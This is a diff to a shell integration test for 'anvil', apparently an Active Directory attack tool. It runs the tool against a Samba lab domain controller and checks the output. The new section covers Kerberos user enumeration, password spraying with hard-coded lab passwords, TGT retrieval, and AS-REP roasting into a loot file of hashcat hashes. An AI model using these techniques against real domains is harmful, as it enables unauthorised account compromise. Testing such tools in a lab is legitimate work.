@@ -672,6 +672,58 @@ assert_fx "enumpipes: samr categorized" "samr" "$S16_OUT"
 assert_fx "ping: session alive" "session alive" "$S16_OUT"
 assert_fx "reconnect: re-establishes" "reconnected" "$S16_OUT"
 
+echo "== [17/17] anvil operator batch (Samba) =="
+# The operator batch against the Samba lab. userenum/spray/gettgt ride
+# the KDC (alice is the lab's no-preauth target); trusts/adcs/whoami take
+# the LDAP channel; loot + transcript are local-file behaviors asserted
+# in the runner's /tmp. asrep is the loot source — kerberoast hits the
+# documented CRealm quirk on Samba (section 4), asrep does not.
+printf 'alice\nAdministrator\nno-such-user\n' > /tmp/users-op.txt
+UENUM_OUT=$($ANVIL userenum -d LAB.LOCAL --dc-ip dc -u /tmp/users-op.txt 2>&1)
+echo "$UENUM_OUT"
+assert_re "userenum: alice VALID_NOPREAUTH (roastable)" 'alice.*VALID_NOPREAUTH' "$UENUM_OUT"
+assert_re "userenum: Administrator VALID" 'Administrator.*VALID' "$UENUM_OUT"
+assert_re "userenum: no-such-user INVALID" 'no-such-user.*INVALID' "$UENUM_OUT"
+assert_fx "userenum: summary renders" "SUMMARY" "$UENUM_OUT"
+SPRAY_OK=$($ANVIL spray -d LAB.LOCAL --dc-ip dc -u /tmp/users-op.txt -p 'AlicePass#2026' 2>&1)
+echo "$SPRAY_OK"
+assert_re "spray: correct password hits alice" 'alice.*SUCCESS' "$SPRAY_OK"
+assert_fx "spray: success counted" "success        1" "$SPRAY_OK"
+SPRAY_BAD=$($ANVIL spray -d LAB.LOCAL --dc-ip dc -u /tmp/users-op.txt -p 'WrongPass#999' 2>&1)
+echo "$SPRAY_BAD"
+assert_no_fx "spray: wrong password never prints SUCCESS" "SUCCESS" "$SPRAY_BAD"
+assert_fx "spray: all attempts failed" "fail           3" "$SPRAY_BAD"
+GETTGT_OUT=$($ANVIL gettgt -u alice -p 'AlicePass#2026' -d lab.local --dc-ip dc -out /tmp/alice-op.ccache 2>&1)
+echo "$GETTGT_OUT"
+assert_fx "gettgt: TGT line" "TGT  alice@LAB.LOCAL" "$GETTGT_OUT"
+[ -s /tmp/alice-op.ccache ] && pass "gettgt: ccache written" || fail "gettgt: ccache written"
+S17_OUT=$($ANVIL connect --host dc -u Administrator -p 'Lab!Admin#2026' -d LAB <<'EOF'
+trusts
+adenum adcs
+whoami
+loot /tmp/loot
+asrep --out asrep-hashes.txt
+exit
+EOF
+)
+S17_RC=$?
+echo "$S17_OUT"
+[ "$S17_RC" -eq 0 ] && pass "operator-cmds: session survives (exit 0)" || fail "operator-cmds: session survives (got $S17_RC)"
+assert_fx "trusts: single-domain forest" "no trusts" "$S17_OUT"
+assert_fx "adenum adcs: no templates on Samba" "(none)" "$S17_OUT"
+assert_fx "whoami: session user resolved" "LAB\Administrator" "$S17_OUT"
+assert_fx "whoami: Domain Admins membership" "Domain Admins" "$S17_OUT"
+assert_fx "loot: directory set" "loot directory: /tmp/loot" "$S17_OUT"
+assert_fx "loot: asrep --out written" "wrote 1 lines to /tmp/loot/asrep-hashes.txt" "$S17_OUT"
+grep -qF '$krb5asrep$' /tmp/loot/asrep-hashes.txt && pass "loot: file holds the hashcat line" || fail "loot: file holds the hashcat line"
+TRANS_OUT=$($ANVIL connect --host dc -u Administrator -p 'Lab!Admin#2026' -d LAB --transcript /tmp/trans-op.txt <<'EOF'
+shares
+exit
+EOF
+)
+grep -qF "anvil transcript" /tmp/trans-op.txt && pass "transcript: header captured" || fail "transcript: header captured"
+grep -qF "LABSHARE" /tmp/trans-op.txt && pass "transcript: command output captured" || fail "transcript: command output captured"
+
 END=$(date +%s)
 echo "== summary =="
 echo "passed: $PASS  failed: $FAIL  ($((END - START))s)"
